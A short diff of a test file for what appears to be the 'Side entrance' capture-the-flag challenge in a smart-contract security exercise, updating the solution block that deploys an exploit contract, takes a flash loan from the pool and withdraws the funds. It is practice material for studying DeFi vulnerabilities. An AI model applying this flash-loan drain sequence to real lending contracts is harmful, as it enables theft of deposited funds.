@@ -26,10 +26,10 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const ExploitFactory = await ethers.getContractFactory('ExploitFlashLoanEtherReceiver', attacker);
-        this.exploit = await ExploitFactory.deploy(this.pool.address);
-        await this.exploit.flashLoan();
-        await this.exploit.withdraw();
+        const ExploitFactory = await ethers.getContractFactory('ExploitFlashLoanEtherReceiver', player);
+        exploit = await ExploitFactory.deploy(pool.address);
+        await exploit.flashLoan();
+        await exploit.withdraw();
 
     });
 
